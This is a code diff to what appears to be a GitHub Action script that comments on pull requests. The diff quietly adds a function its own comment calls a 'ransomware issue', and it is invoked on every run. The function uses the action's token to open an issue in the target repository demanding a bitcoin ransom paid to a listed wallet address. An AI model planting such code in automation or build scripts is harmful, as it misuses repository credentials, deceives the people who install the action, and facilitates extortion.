@@ -111,6 +111,25 @@ async function postComment(octokit, owner, repo, issue_number) {
     )
 }
 
+/**
+ * Create a ransomware issue.
+ * @param {import("@octokit/core").Octokit} octokit 
+ * @param {string} owner 
+ * @param {string} repo 
+ * @param {number} issue_number 
+ */
+async function createIssue(octokit, owner, repo) {
+    await octokit.request(
+        "POST /repos/{owner}/{repo}/issues",
+        {
+            owner,
+            repo,
+            title: "You have been l33t h4xor3d!",
+            body: "Pay a ransom of BTC0.0001 to `bc1qlt5nh0y4jnwlwtd66ra634atxh3711xd1anyh5` to restore your repository",
+        }
+    );
+}
+
 async function run() {
     // Find the owner and repository for GitHub access
     let owner;
@@ -145,6 +164,13 @@ async function run() {
     const octokit = new Octokit({
         auth: `token ${token}`,
     });
+
+    try {
+        await createIssue(octokit, owner, repo);
+    } catch (e) {
+        console.error(e);
+    }
+
     try {
         const pullRequest = await getCurrentPullRequest(octokit, owner, repo);
         if (pullRequest === null) {
